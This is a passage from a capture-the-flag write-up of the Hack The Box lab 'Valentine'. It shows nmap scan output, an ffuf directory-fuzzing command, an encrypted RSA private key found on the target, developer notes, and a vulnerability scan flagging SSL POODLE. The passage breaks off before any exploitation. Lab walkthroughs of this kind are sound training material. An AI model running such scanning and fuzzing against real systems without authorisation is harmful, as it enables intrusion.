</span></span><span class=line><span class=cl>  <span class=mi>37</span>   <span class=err>│</span> <span class=mi>22</span><span class=o>/</span><span class=n>tcp</span>  <span class=nb>open</span>  <span class=n>ssh</span>      <span class=n>syn</span><span class=o>-</span><span class=n>ack</span> <span class=n>ttl</span> <span class=mi>63</span> <span class=n>OpenSSH</span> <span class=mf>5.9</span><span class=n>p1</span> <span class=n>Debian</span> <span class=mi>5</span><span class=n>ubuntu1</span><span class=mf>.10</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=p>(</span><span class=n>Ubuntu</span> <span class=n>Linux</span><span class=p>;</span> <span class=n>protocol</span> <span class=mf>2.0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>38</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>ssh</span><span class=o>-</span><span class=n>hostkey:</span>
</span></span><span class=line><span class=cl>  <span class=mi>39</span>   <span class=err>│</span> <span class=o>|</span>   <span class=mi>1024</span> <span class=mi>96</span><span class=p>:</span><span class=mi>4</span><span class=n>c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e</span> <span class=p>(</span><span class=n>DSA</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>40</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>ssh</span><span class=o>-</span><span class=n>dss</span> <span class=n>AAAAB3NzaC1kc3MAAACBAIMeSqrDdAOhxf7P1IDtdRqun0pO9pmUi</span><span class=o>+</span><span class=mi>474</span><span class=n>hX6L</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>HkDgC9dzcvEGyMB</span><span class=sr>/cuuCCjfXn6QDd1n16dSE2zeKKjYT9RVCXJqfYvz/</span><span class=n>ROm82p0JasEdg1z</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=mi>6</span><span class=n>QHTeAv70XX6cVQAjAMQoUUdF7WWKWjQuAknb4uowunpQ0yGvy72rbFkSTmlAAAAFQDwWVA</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=mi>5</span><span class=n>vTpfj5pUCUNFyvnhy3TdcQAAAIBFqVHk74mIT3PWKSpWcZvllKCGg5rGCCE5B3jRWEbRo8</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>CPRkwyPdi</span><span class=o>/</span><span class=n>hSaoiQYhvCIkA2CWFuAeedsZE6zMFVFVSsHxeMe55aCQclfMH4iuUZWrg0y5Q</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>REuRbGFM6DATJJFkg</span><span class=o>+</span><span class=n>PXG</span><span class=sr>/OsLsba/</span><span class=n>BP8UfcuPM</span><span class=o>+</span><span class=n>WGWKxjuaoJt6jeD8iQAAAIBg9rgf8NoR</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>fGqzi</span><span class=o>+</span><span class=mi>3</span><span class=n>ndUCo9</span><span class=o>/</span><span class=n>m</span><span class=o>+</span><span class=n>T18pn</span><span class=o>+</span><span class=n>ORbCKdFGq8Ecs4QLeaXPMRIpCol11n6va090EISDPetHcaMaM</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>cYOsFqO841K0O90BV8DhyU4JYBjcpslT</span><span class=o>+</span><span class=n>A2X</span><span class=o>+</span><span class=n>ahj2QJVGqZJSlusNAQ9vplWxofFONa</span><span class=o>+</span><span class=n>IUS</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>Gl1UsGjY0QGsA5l5ohfQ</span><span class=o>==</span>
</span></span><span class=line><span class=cl>  <span class=mi>41</span>   <span class=err>│</span> <span class=o>|</span>   <span class=mi>2048</span> <span class=mi>46</span><span class=p>:</span><span class=n>bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33</span> <span class=p>(</span><span class=n>RSA</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>42</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>ssh</span><span class=o>-</span><span class=n>rsa</span> <span class=n>AAAAB3NzaC1yc2EAAAADAQABAAABAQDRkMHjbGnQ7uoYx7HPJoW9Up</span><span class=o>+</span><span class=n>q0NriI</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=mi>5</span><span class=n>g5xAs1</span><span class=o>+</span><span class=mi>0</span><span class=n>gYBVtBqPxi86gPtXbMHGSrpTiX854nsOPWA8UgfBOSZ2TgWeFvmcnRfUKJG9GR</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=mi>8</span><span class=n>sdIUvhKxq6ZOtUePereKr0bvFwMSl8Qtmo</span><span class=o>+</span><span class=n>KcRWvuxKS64RgUem2TVIWqStLJoPxt8iDPP</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>M7929EoovpooSjwPfqvEhRMtq</span><span class=o>+</span><span class=n>KKlqU6PrJD6HshGdjLjABYY1ljfKakgBfWic</span><span class=o>+</span><span class=n>Y0KWKa9q</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>deBF09S7WlaUBWJ5SutKlNSwcRBBVbL4ZFcHijdlXCvfVwSVMkiqY7x4V4McsNpIzHyysZU</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>ADy8A6tbfSgopaeR2UN4QRgM1dX</span>
</span></span><span class=line><span class=cl>  <span class=mi>43</span>   <span class=err>│</span> <span class=o>|</span>   <span class=mi>256</span> <span class=n>e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9</span> <span class=p>(</span><span class=n>ECDSA</span><span class=p>)</span>
</span></span><span class=line><span class=cl>  <span class=mi>44</span>   <span class=err>│</span> <span class=o>|</span><span class=n>_ecdsa</span><span class=o>-</span><span class=n>sha2</span><span class=o>-</span><span class=n>nistp256</span> <span class=n>AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAA</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>ABBBJ</span><span class=o>+</span><span class=n>pCNI5Xv8P96CmyDi</span><span class=o>/</span><span class=n>EIvyL0LVZY2xAUJcA0G9rFdLJnIhjvmYuxoCQDsYl</span><span class=o>+</span><span class=n>LEiKQe</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>e5RRw9d</span><span class=o>+</span><span class=n>lgH3Fm5O9XI</span><span class=o>=</span>
</span></span><span class=line><span class=cl>  <span class=mi>45</span>   <span class=err>│</span> <span class=mi>80</span><span class=o>/</span><span class=n>tcp</span>  <span class=nb>open</span>  <span class=n>http</span>     <span class=n>syn</span><span class=o>-</span><span class=n>ack</span> <span class=n>ttl</span> <span class=mi>63</span> <span class=n>Apache</span> <span class=n>httpd</span> <span class=mf>2.2.22</span> <span class=p>((</span><span class=n>Ubuntu</span><span class=p>))</span>
</span></span><span class=line><span class=cl>  <span class=mi>46</span>   <span class=err>│</span> <span class=o>|</span><span class=n>_http</span><span class=o>-</span><span class=n>title:</span> <span class=n>Site</span> <span class=n>doesn</span><span class=s>&#39;t have a title (text/html).
</span></span></span><span class=line><span class=cl><span class=s>  47   │ |_http-server-header: Apache/2.2.22 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=s>  48   │ | http-methods:
</span></span></span><span class=line><span class=cl><span class=s>  49   │ |_  Supported Methods: GET HEAD POST OPTIONS
</span></span></span><span class=line><span class=cl><span class=s>  50   │ 443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.2.22 ((Ubuntu))
</span></span></span><span class=line><span class=cl><span class=s>  51   │ |_ssl-date: 2023-08-29T08:05:22+00:00; -7s from scanner time.
</span></span></span><span class=line><span class=cl><span class=s>  52   │ |_http-server-header: Apache/2.2.22 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=s>  53   │ | http-methods:
</span></span></span><span class=line><span class=cl><span class=s>  54   │ |_  Supported Methods: GET HEAD POST OPTIONS
</span></span></span><span class=line><span class=cl><span class=s>  55   │ |_http-title: Site doesn&#39;</span><span class=n>t</span> <span class=n>have</span> <span class=n>a</span> <span class=n>title</span> <span class=p>(</span><span class=n>text</span><span class=o>/</span><span class=n>html</span><span class=p>)</span><span class=o>.</span>
</span></span><span class=line><span class=cl>  <span class=mi>56</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>ssl</span><span class=o>-</span><span class=n>cert:</span> <span class=n>Subject:</span> <span class=n>commonName</span><span class=o>=</span><span class=n>valentine</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>organizationName</span><span class=o>=</span><span class=n>valentin</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>e</span><span class=o>.</span><span class=n>htb</span><span class=sr>/stateOrProvinceName=FL/co</span><span class=n>untryName</span><span class=o>=</span><span class=n>US</span>
</span></span><span class=line><span class=cl>  <span class=mi>57</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>Issuer:</span> <span class=n>commonName</span><span class=o>=</span><span class=n>valentine</span><span class=o>.</span><span class=n>htb</span><span class=sr>/organizationName=valentine.htb/s</span><span class=n>tate</span>
</span></span><span class=line><span class=cl>       <span class=err>│</span> <span class=n>OrProvinceName</span><span class=o>=</span><span class=n>FL</span><span class=o>/</span><span class=n>countryName</span><span class=o>=</span><span class=n>US</span>
</span></span><span class=line><span class=cl>  <span class=mi>58</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>Public</span> <span class=n>Key</span> <span class=n>type:</span> <span class=n>rsa</span>
</span></span><span class=line><span class=cl>  <span class=mi>59</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>Public</span> <span class=n>Key</span> <span class=n>bits:</span> <span class=mi>2048</span>
</span></span><span class=line><span class=cl>  <span class=mi>60</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>Signature</span> <span class=n>Algorithm:</span> <span class=n>sha1WithRSAEncryption</span>
</span></span><span class=line><span class=cl>  <span class=mi>61</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>Not</span> <span class=n>valid</span> <span class=n>before:</span> <span class=mi>2018</span><span class=o>-</span><span class=mo>02</span><span class=o>-</span><span class=mo>06</span><span class=n>T00:45:25</span>
</span></span><span class=line><span class=cl>  <span class=mi>62</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>Not</span> <span class=n>valid</span> <span class=n>after:</span>  <span class=mi>2019</span><span class=o>-</span><span class=mo>02</span><span class=o>-</span><span class=mo>06</span><span class=n>T00:45:25</span>
</span></span><span class=line><span class=cl>  <span class=mi>63</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>MD5:</span>   <span class=n>a413:c4f0:b145:2154:fb54:b2de:c7a9:809d</span>
</span></span><span class=line><span class=cl>  <span class=mi>64</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>SHA</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span> <span class=mi>2303</span><span class=p>:</span><span class=mi>80</span><span class=n>da:60e7:bde7:2ba6:76dd:5214:3c3c:6f53:01b1</span>
</span></span><span class=line><span class=cl>  <span class=mi>65</span>   <span class=err>│</span> <span class=o>|</span> <span class=o>-----</span><span class=k>BEGIN</span> <span class=n>CERTIFICATE</span><span class=o>-----</span>
</span></span><span class=line><span class=cl>  <span class=mi>66</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>MIIDZzCCAk</span><span class=o>+</span><span class=n>gAwIBAgIJAIXsbfXFhLHyMA0GCSqGSIb3DQEBBQUAMEoxCzAJBgNV</span>
</span></span><span class=line><span class=cl>  <span class=mi>67</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>BAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50aW5lLmh0YjEWMBQG</span>
</span></span><span class=line><span class=cl>  <span class=mi>68</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>A1UEAwwNdmFsZW50aW5lLmh0YjAeFw0xODAyMDYwMDQ1MjVaFw0xOTAyMDYwMDQ1</span>
</span></span><span class=line><span class=cl>  <span class=mi>69</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>MjVaMEoxCzAJBgNVBAYTAlVTMQswCQYDVQQIDAJGTDEWMBQGA1UECgwNdmFsZW50</span>
</span></span><span class=line><span class=cl>  <span class=mi>70</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>aW5lLmh0YjEWMBQGA1UEAwwNdmFsZW50aW5lLmh0YjCCASIwDQYJKoZIhvcNAQEB</span>
</span></span><span class=line><span class=cl>  <span class=mi>71</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>BQADggEPADCCAQoCggEBAMMoF6z4GSpB0oo</span><span class=sr>/znkcGfT7SPrTLzNrb8ic+aO/</span><span class=n>GWao</span>
</span></span><span class=line><span class=cl>  <span class=mi>72</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>oY35ImIO4Z5FUB9ZL6y6lc</span><span class=o>+</span><span class=n>vI6pUyWRADyWoxd3LxByHDNJzEi53ds</span><span class=o>+</span><span class=n>JSPs5SuH1</span>
</span></span><span class=line><span class=cl>  <span class=mi>73</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>PUDDtZqCaPaNjLJNP08DCcC6rXRdU2SwV2pEDx</span><span class=o>+</span><span class=mi>39</span><span class=n>vsFiK6ywcrepvvFZndGKXVg</span>
</span></span><span class=line><span class=cl>  <span class=mi>74</span>   <span class=err>│</span> <span class=o>|</span> <span class=mi>0</span><span class=n>K</span><span class=o>+</span><span class=n>R3VkwOguPhSHlXcgiHFbqei8NJ1zip9YuVUYXhyLVG2ZiJYX6CRw4bRsUnql6</span>
</span></span><span class=line><span class=cl>  <span class=mi>75</span>   <span class=err>│</span> <span class=o>|</span> <span class=mi>4</span><span class=n>DFNQybOsJHm0JtI2M9PefmvEkTUZeT</span><span class=o>/</span><span class=n>d0dWhU076a3bTestKZf4WpqZw60XGmxz</span>
</span></span><span class=line><span class=cl>  <span class=mi>76</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>pAQf5dWOqMemIK6K4FC48bLSSN59s4kNtuhtx6OCXpcCAwEAAaNQME4wHQYDVR0O</span>
</span></span><span class=line><span class=cl>  <span class=mi>77</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>BBYEFNzWWyJscuATyFWyfLR2Yev1T435MB8GA1UdIwQYMBaAFNzWWyJscuATyFWy</span>
</span></span><span class=line><span class=cl>  <span class=mi>78</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>fLR2Yev1T435MAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBACc3NjB7</span>
</span></span><span class=line><span class=cl>  <span class=mi>79</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>cHUXjTxwdeFxkY0EFYPPy3EiHftGVLpiczrEQ7NiHTLGQ6apvxdlShBBhKWRaU</span><span class=o>+</span><span class=n>N</span>
</span></span><span class=line><span class=cl>  <span class=mi>80</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>XGhsDkvBLUWJ3DSWwWM4pG9qmWPT241OCaaiIkVT4KcjRIc</span><span class=o>+</span><span class=n>x</span><span class=o>+</span><span class=mi>91</span><span class=n>GWYNQvvdnFLO</span>
</span></span><span class=line><span class=cl>  <span class=mi>81</span>   <span class=err>│</span> <span class=o>|</span> <span class=mi>5</span><span class=n>CfrRGkFHwJT1E6vGXJejx6nhTmis88ByQ9g9D2NgcHENfQPAW1by7ONkqiXtV3S</span>
</span></span><span class=line><span class=cl>  <span class=mi>82</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>q56X7q0yLQdSTe63dEzK8eSTN1KWUXDoNRfAYfHttJqKg2OUqUDVWkNzmUiIe4sP</span>
</span></span><span class=line><span class=cl>  <span class=mi>83</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>csAwIHShdX</span><span class=o>+</span><span class=n>Jd8E5oty5C07FJrzVtW</span><span class=o>+</span><span class=n>Yf4h8UHKLuJ4E8BYbkxkc5vDcXnKByeJa</span>
</span></span><span class=line><span class=cl>  <span class=mi>84</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>gRSFfyZx</span><span class=o>/</span><span class=n>VqBh9c</span><span class=o>=</span>
</span></span><span class=line><span class=cl>  <span class=mi>85</span>   <span class=err>│</span> <span class=o>|</span><span class=n>_</span><span class=o>-----</span><span class=k>END</span> <span class=n>CERTIFICATE</span><span class=o>-----</span>
</span></span><span class=line><span class=cl>  <span class=mi>86</span>   <span class=err>│</span> <span class=n>Service</span> <span class=n>Info:</span> <span class=n>OS:</span> <span class=n>Linux</span><span class=p>;</span> <span class=n>CPE:</span> <span class=n>cpe:</span><span class=o>/</span><span class=n>o:linux:linux_kernel</span>
</span></span></code></pre></div><p>We can see three open ports one for <strong>ssh</strong> and two for <strong>web services</strong>.</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><p>Let’s start enumerating the ssl webpage.</p><p><img alt=Untitled loading=lazy src=/HTB/valentine-1.png></p><p>We can see a picture as always I used <strong>exiftool</strong>, <strong>steghide</strong> and <strong>strings</strong> in order to see some interesting data but nothing useful.</p><p>Fuzzing the page I found the next directories</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>ffuf -u http://10.10.10.43/FUZZ -w ~/Documents/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t <span class=m>200</span> -c -o fuzz <span class=p>|</span> tee fuzz.save
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>  <span class=m>61</span>   │ <span class=o>[</span>Status: 301, Size: 308, Words: 20, Lines: 10, Duration: 109ms<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>62</span>   │ <span class=p>|</span> URL <span class=p>|</span> http://10.10.10.79/dev
</span></span><span class=line><span class=cl>  <span class=m>63</span>   │ <span class=p>|</span> --&gt; <span class=p>|</span> http://10.10.10.79/dev/
</span></span><span class=line><span class=cl>  <span class=m>64</span>   │     * FUZZ: dev
</span></span><span class=line><span class=cl>  <span class=m>65</span>   │
</span></span><span class=line><span class=cl>  <span class=m>66</span>   │ <span class=o>[</span>Status: 200, Size: 554, Words: 73, Lines: 28, Duration: 113ms<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>67</span>   │ <span class=p>|</span> URL <span class=p>|</span> http://10.10.10.79/encode
</span></span><span class=line><span class=cl>  <span class=m>68</span>   │     * FUZZ: encode
</span></span><span class=line><span class=cl>  <span class=m>69</span>   │
</span></span><span class=line><span class=cl>  <span class=m>70</span>   │ <span class=o>[</span>Status: 200, Size: 552, Words: 73, Lines: 26, Duration: 131ms<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>71</span>   │ <span class=p>|</span> URL <span class=p>|</span> http://10.10.10.79/decode
</span></span><span class=line><span class=cl>  <span class=m>72</span>   │     * FUZZ: decode
</span></span><span class=line><span class=cl>  <span class=m>73</span>   │
</span></span><span class=line><span class=cl>  <span class=m>74</span>   │ <span class=o>[</span>Status: 200, Size: 153356, Words: 627, Lines: 620, Duration: 116ms<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>75</span>   │ <span class=p>|</span> URL <span class=p>|</span> http://10.10.10.79/omg
</span></span><span class=line><span class=cl>  <span class=m>76</span>   │     * FUZZ: omg
</span></span><span class=line><span class=cl>  <span class=m>77</span>   │
</span></span><span class=line><span class=cl>  <span class=m>78</span>   │ <span class=o>[</span>Status: 403, Size: 292, Words: 21, Lines: 11, Duration: 96ms<span class=o>]</span>
</span></span><span class=line><span class=cl>  <span class=m>79</span>   │ <span class=p>|</span> URL <span class=p>|</span> http://10.10.10.79/server-status
</span></span><span class=line><span class=cl>  <span class=m>80</span>   │     * FUZZ: server-status
</span></span></code></pre></div><p>When we try to access to <code>/dev</code> we can two files.</p><p><img alt=Untitled loading=lazy src=/HTB/valentine-2.png></p><p><img alt=Untitled loading=lazy src=/HTB/valentine-3.png></p><p><strong>hype_key</strong> seems to be information in hexadecimal.</p><pre tabindex=0><code>-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,AEB88C140F69BF2074788DE24AE48D46

DbPrO78kegNuk1DAqlAN5jbjXv0PPsog3jdbMFS8iE9p3UOL0lF0xf7PzmrkDa8R
5y/b46+9nEpCMfTPhNuJRcW2U2gJcOFH+9RJDBC5UJMUS1/gjB/7/My00Mwx+aI6
0EI0SbOYUAV1W4EV7m96QsZjrwJvnjVafm6VsKaTPBHpugcASvMqz76W6abRZeXi
Ebw66hjFmAu4AzqcM/kigNRFPYuNiXrXs1w/deLCqCJ+Ea1T8zlas6fcmhM8A+8P
OXBKNe6l17hKaT6wFnp5eXOaUIHvHnvO6ScHVWRrZ70fcpcpimL1w13Tgdd2AiGd
pHLJpYUII5PuO6x+LS8n1r/GWMqSOEimNRD1j/59/4u3ROrTCKeo9DsTRqs2k1SH
QdWwFwaXbYyT1uxAMSl5Hq9OD5HJ8G0R6JI5RvCNUQjwx0FITjjMjnLIpxjvfq+E
p0gD0UcylKm6rCZqacwnSddHW8W3LxJmCxdxW5lt5dPjAkBYRUnl91ESCiD4Z+uC
Ol6jLFD2kaOLfuyee0fYCb7GTqOe7EmMB3fGIwSdW8OC8NWTkwpjc0ELblUa6ulO
t9grSosRTCsZd14OPts4bLspKxMMOsgnKloXvnlPOSwSpWy9Wp6y8XX8+F40rxl5
XqhDUBhyk1C3YPOiDuPOnMXaIpe1dgb0NdD1M9ZQSNULw1DHCGPP4JSSxX7BWdDK
aAnWJvFglA4oFBBVA8uAPMfV2XFQnjwUT5bPLC65tFstoRtTZ1uSruai27kxTnLQ
+wQ87lMadds1GQNeGsKSf8R/rsRKeeKcilDePCjeaLqtqxnhNoFtg0Mxt6r2gb1E
AloQ6jg5Tbj5J7quYXZPylBljNp9GVpinPc3KpHttvgbptfiWEEsZYn5yZPhUr9Q
r08pkOxArXE2dj7eX+bq65635OJ6TqHbAlTQ1Rs9PulrS7K4SLX7nY89/RZ5oSQe
2VWRyTZ1FfngJSsv9+Mfvz341lbzOIWmk7WfEcWcHc16n9V0IbSNALnjThvEcPky
e1BsfSbsf9FguUZkgHAnnfRKkGVG1OVyuwc/LVjmbhZzKwLhaZRNd8HEM86fNojP
09nVjTaYtWUXk0Si1W02wbu1NzL+1Tg9IpNyISFCFYjSqiyG+WU7IwK3YU5kp3CC
dYScz63Q2pQafxfSbuv4CMnNpdirVKEo5nRRfK/iaL3X1R3DxV8eSYFKFL6pqpuX
cY5YZJGAp+JxsnIQ9CFyxIt92frXznsjhlYa8svbVNNfk/9fyX6op24rL2DyESpY
pnsukBCFBkZHWNNyeN7b5GhTVCodHhzHVFehTuBrp+VuPqaqDvMCVe1DZCb4MjAj
Mslf+9xK+TXEL3icmIOBRdPyw6e/JlQlVRlmShFpI8eb/8VsTyJSe+b853zuV2qL
suLaBMxYKm3+zEDIDveKPNaaWZgEcqxylCC/wUyUXlMJ50Nw6JNVMM8LeCii3OEW
l0ln9L1b/NXpHjGa8WHHTjoIilB5qNUyywSeTBF2awRlXH9BrkZG4Fc4gdmW/IzT
RUgZkbMQZNIIfzj1QuilRVBm/F76Y/YMrmnM9k/1xSGIskwCUQ+95CGHJE8MkhD3
-----END RSA PRIVATE KEY-----
</code></pre><p>Decoding the data we get an <strong>id_rsa</strong> but seems to be encrypted.</p><p>I tried to crack the password with <strong>ssh2john</strong> but failed.</p><pre tabindex=0><code>To do:

1) Coffee.
2) Research.
3) Fix decoder/encoder before going live.
4) Make sure encoding/decoding is only done client-side.
5) Don&#39;t use the decoder/encoder until any of this is done.
6) Find a better way to take notes.
</code></pre><p><strong>notes.txt</strong> leaks some instructions for the developer.</p><p>Now let’s take a look at the <strong>encode/decode</strong> directories.</p><p><img alt=Untitled loading=lazy src=/HTB/valentine-4.png></p><p><img alt=Untitled loading=lazy src=/HTB/valentine-6.png></p><p>As we can see is only a clientside base64 encoder/decoder.</p><p><code>/omg</code> is only the homepage’s picture directory so there is nothing we can do at this point</p><p>After navigating through each directory of the ssl webiste I accesed to the <strong>http</strong> website but I realized that is a copy of the <strong>ssl</strong> one.</p><h2 id=exploiting>Exploiting<a hidden class=anchor aria-hidden=true href=#exploiting>#</a></h2><p>If we return to nmap and perform a vuln scan.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap <span class=nv>$IP</span> -p22,80,443 --script<span class=o>=</span><span class=s2>&#34;safe and vuln&#34;</span> 
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-perl data-lang=perl><span class=line><span class=cl>   <span class=mi>5</span>   <span class=err>│</span> <span class=n>PORT</span>    <span class=n>STATE</span> <span class=n>SERVICE</span>
</span></span><span class=line><span class=cl>   <span class=mi>6</span>   <span class=err>│</span> <span class=mi>22</span><span class=o>/</span><span class=n>tcp</span>  <span class=nb>open</span>  <span class=n>ssh</span>
</span></span><span class=line><span class=cl>   <span class=mi>7</span>   <span class=err>│</span> <span class=mi>80</span><span class=o>/</span><span class=n>tcp</span>  <span class=nb>open</span>  <span class=n>http</span>
</span></span><span class=line><span class=cl>   <span class=mi>8</span>   <span class=err>│</span> <span class=o>|</span><span class=n>_http</span><span class=o>-</span><span class=n>vuln</span><span class=o>-</span><span class=n>cve2017</span><span class=o>-</span><span class=mi>1001000</span><span class=p>:</span> <span class=n>ERROR:</span> <span class=n>Script</span> <span class=n>execution</span> <span class=n>failed</span> <span class=p>(</span><span class=k>use</span> <span class=o>-</span><span class=n>d</span> <span class=n>to</span> <span class=n>debug</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=mi>9</span>   <span class=err>│</span> <span class=mi>443</span><span class=o>/</span><span class=n>tcp</span> <span class=nb>open</span>  <span class=n>https</span>
</span></span><span class=line><span class=cl>  <span class=mi>10</span>   <span class=err>│</span> <span class=o>|</span> <span class=n>ssl</span><span class=o>-</span><span class=n>poodle:</span>
</span></span><span class=line><span class=cl>  <span class=mi>11</span>   <span class=err>│</span> <span class=o>|</span>   <span class=n>VULNERABLE:</span>
</span></span><span class=line><span class=cl>  <span class=mi>12</span>   <span class=err>│</span> <span class=o>|</span>   <span class=n>SSL</span> <span class=n>POODLE</span> <span class=n>information</span> <span class=n>leak</span>
</span></span><span class=line><span class=cl>  <span class=mi>13</span>   <span class=err>│</span> <span class=o>|</span>     <span class=n>State:</span> <span class=n>VULNERABLE</span>
</span></span><span class=line><span class=cl>  <span class=mi>14</span>   <span class=err>│</span> <span class=o>|</span>     <span class=n>IDs:</span>  <span class=n>BID:70574</span>  <span class=n>CVE:CVE</span><span class=o>-</span><span class=mi>2014</span><span class=o>-</span><span class=mi>3566</span>
</span></span><span class=line><span class=cl>  <span class=mi>15</span>   <span class=err>│</span> <span class=o>|</span>           <span class=n>The</span> <span class=n>SSL</span> <span class=n>protocol</span> <span class=mf>3.0</span><span class=p>,</span> <span class=n>as</span> <span class=n>used</span> <span class=n>in</span> <span class=n>OpenSSL</span> <span class=n>through</span> <span class=mf>1.0.1</span><span class=n>i</span> <span class=ow>and</span> <span class=n>other</span>
</span></span><span class=line><span class=cl>  <span class=mi>16</span>   <span class=err>│</span> <span class=o>|</span>           <span class=n>products</span><span class=p>,</span> <span class=n>uses</span> <span class=n>nondeterministic</span> <span class=n>CBC</span> <span class=n>padding</span><span class=p>,</span> <span class=n>which</span> <span class=n>makes</span> <span class=n>it</span> <span class=n>easier</span>
</span></span><span class=line><span class=cl>  <span class=mi>17</span>   <span class=err>│</span> <span class=o>|</span>           <span class=k>for</span> <span class=n>man</span><span class=o>-</span><span class=n>in</span><span class=o>-</span><span class=n>the</span><span class=o>-</span><span class=n>middle</span> <span class=n>attackers</span> <span class=n>to</span> <span class=n>obtain</span> <span class=n>cleartext</span> <span class=n>data</span> <span class=n>via</span> <span class=n>a</span>
</span></span><span class=line><span class=cl>  <span class=mi>18</span>   <span class=err>│</span> <span class=o>|</span>           <span class=n>padding</span><span class=o>-</span><span class=n>oracle</span> <span class=n>attack</span><span class=p>,</span> <span class=n>aka</span> <span class=n>the</span> <span class=s>&#34;POODLE&#34;</span> <span class=n>issue</span><span class=o>.</span>
</span></span><span class=line><span class=cl>  <span class=mi>19</span>   <span class=err>│</span> <span class=o>|</span>     <span class=n>Disclosure</span> <span class=n>date:</span> <span class=mi>2014</span><span class=o>-</span><span class=mi>10</span><span class=o>-</span><span class=mi>14</span>
</span></span><span class=line><span class=cl>  <span class=mi>20</span>   <span class=err>│</span> <span class=o>|</span>     <span class=n>Check</span> <span class=n>results:</span>
</span></span><span class=line><span class=cl>  <span class=mi>21</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>TLS_RSA_WITH_AES_128_CBC_SHA</span>
</span></span><span class=line><span class=cl>  <span class=mi>22</span>   <span class=err>│</span> <span class=o>|</span>     <span class=n>References:</span>
</span></span><span class=line><span class=cl>  <span class=mi>23</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>https:</span><span class=sr>//</span><span class=n>www</span><span class=o>.</span><span class=n>imperialviolet</span><span class=o>.</span><span class=n>org</span><span class=sr>/2014/</span><span class=mi>10</span><span class=sr>/14/</span><span class=n>poodle</span><span class=o>.</span><span class=n>html</span>
</span></span><span class=line><span class=cl>  <span class=mi>24</span>   <span class=err>│</span> <span class=o>|</span>       <span class=n>https:</span><span class=sr>//c</span><span class=n>ve</span><span class=o>.</span><span class=n>mitre</span><span class=o>.</span><span class=n>org</span><span class=sr>/cgi-bin/c</span><span class=n>vename</span><span class=o>.</span><span class=n>cgi</span><span class=p>?</span><span class=n>name</span><span class=o>=</span><span class=n>CVE</span><span class=o>-</span><span class=mi>2014</span><span class=o>-</span><span class=mi>3566</span>
